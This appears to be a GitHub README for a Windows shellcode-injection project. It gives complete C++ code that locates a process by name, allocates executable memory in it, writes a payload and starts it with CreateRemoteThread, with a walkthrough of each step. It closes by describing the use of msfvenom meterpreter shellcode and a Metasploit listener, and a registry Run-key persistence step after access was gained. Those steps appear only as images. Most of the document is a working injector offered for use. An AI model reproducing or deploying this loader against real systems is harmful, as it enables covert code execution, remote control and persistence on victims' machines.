Project: Demonstrate the technique of shellcode injection into a running Windows process. Locate a process, allocate memory, write shellcode, and execute it within the target process.

&nbsp;

# Code

```C++
#include <iostream>
#include <windows.h>
#include <tlhelp32.h>

unsigned char payload[] = " <The shellcode goes here> ";

DWORD GetProcessID(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::wcerr << L"CreateToolhelp32Snapshot failed. Error: " << GetLastError() << std::endl;
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe)) {
        std::wcerr << L"Process32First failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hSnapshot);
        return 0;
    }

    DWORD processID = 0;
    do {
        if (processName == pe.szExeFile) {
            processID = pe.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe));

    CloseHandle(hSnapshot);

    if (processID == 0) {
        std::wcout << L"Process not found." << std::endl;
    }
    else {
        std::wcout << L"Process ID of " << processName << L" is: " << processID << std::endl;
    }

    return processID;
}

int main() {
    std::wstring processName = L"CalculatorApp.exe";
    DWORD procID = GetProcessID(processName);

    if (procID == 0) {
        std::cerr << "Failed to get process ID. Exiting." << std::endl;
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    if (hProcess == NULL) {
        std::cerr << "Failed to open process. Error: " << GetLastError() << std::endl;
        return 1;
    }

    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(payload), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        std::cerr << "Failed to allocate memory in the target process. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    if (WriteProcessMemory(hProcess, remoteBuffer, payload, sizeof(payload), NULL) == 0) {
        std::cerr << "Failed to write memory in the target process. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (remoteThread == NULL) {
        std::cerr << "Failed to create remote thread. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }


    std::cout << "Shellcode injected into target process." << std::endl;

    WaitForSingleObject(remoteThread, INFINITE);
    CloseHandle(remoteThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}

```

&nbsp;

&nbsp;

## **Includes**

Including headers:

- **iostream** - Standard Input/Output
- **Windows.h** - For interacting with the Windows API
- **tlhelp32.h** - For managing processes

```C++
#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
```

&nbsp;

## **Defining the payload**

This is where the payload that will be injected into the specified process will be defined

```C++
unsigned char payload[] = " <The shellcode goes here> ";

```

&nbsp;

## **GetProcessID Function**

This function takes the name of a process and searches for the process by name by creating a snapshot of all processes, then iterating through the list of processes. If the process is found it will return the process ID of the specified process (DWORD)

&nbsp;

```C++
DWORD GetProcessID(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::wcerr << L"CreateToolhelp32Snapshot failed. Error: " << GetLastError() << std::endl;
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe)) {
        std::wcerr << L"Process32First failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hSnapshot);
        return 0;
    }

    DWORD processID = 0;
    do {
        if (processName == pe.szExeFile) {
            processID = pe.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe));

    CloseHandle(hSnapshot);

    if (processID == 0) {
        std::wcout << L"Process not found." << std::endl;
    }
    else {
        std::wcout << L"Process ID of " << processName << L" is: " << processID << std::endl;
    }

    return processID;
}
```

- **CreateToolhelp32Snapshot**: Creates a snapshot of the system’s processes.
- **PROCESSENTRY32**: Contains information about a process, such as the ID associated with the process.
- **Process32First/Process32Next**: Iterates through the list of processes gathered from CreateToolhelp32Snapshot().

&nbsp;

&nbsp;

## The main() function

Calls the GetProcessID() function mentioned earlier. After getting the process ID, it opens a handle to the process, allocates memory to the process, writes the shellcode to the allocated memory, then finally creates a remote thread in order to execute the shellcode.

```C++
int main() {
    std::wstring processName = L"CalculatorApp.exe";
    DWORD procID = GetProcessID(processName);

    if (procID == 0) {
        std::cerr << "Failed to get process ID. Exiting." << std::endl;
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    if (hProcess == NULL) {
        std::cerr << "Failed to open process. Error: " << GetLastError() << std::endl;
        return 1;
    }

    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(payload), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        std::cerr << "Failed to allocate memory in the target process. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    if (WriteProcessMemory(hProcess, remoteBuffer, payload, sizeof(payload), NULL) == 0) {
        std::cerr << "Failed to write memory in the target process. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (remoteThread == NULL) {
        std::cerr << "Failed to create remote thread. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }


    std::cout << "Shellcode injected into target process." << std::endl;

    WaitForSingleObject(remoteThread, INFINITE);
    CloseHandle(remoteThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}

```

- **OpenProcess** - Opens a handle to the process
- **VirtualAllocEx** - Allocates memory
- **WriteProcessMemory** - Writes the shellcode to allocated memory
- **CreateRemoteThread** - Create a new thread in order to execute the shellcode
- **WaitForSingleObject** - Wait for the remote thread to finish executing
- **CloseHandle** - Closes handles to the remote thread and the process
- **VirtualFreeEx** - Frees the allocated Memory

&nbsp;

&nbsp;

&nbsp;

# Generating and Using Shellcode with msfvenom

&nbsp;

Generating meterpreter shellcode using **msfvenom** to paste into the 'payload' variable:![image](https://github.com/user-attachments/assets/bb3fd137-6034-4bc7-befa-74caf2706a98)


&nbsp;

&nbsp;

Setting up the listener on Metasploit:

![image](https://github.com/user-attachments/assets/53d2ac8e-033b-4474-a9cf-5011395d501d)

I gained access to the remote machine and then added a new value to the Run key in the registry for persistence:
![image](https://github.com/user-attachments/assets/a443fe0b-66c8-49bc-a246-79580b03f168)



&nbsp;

&nbsp;
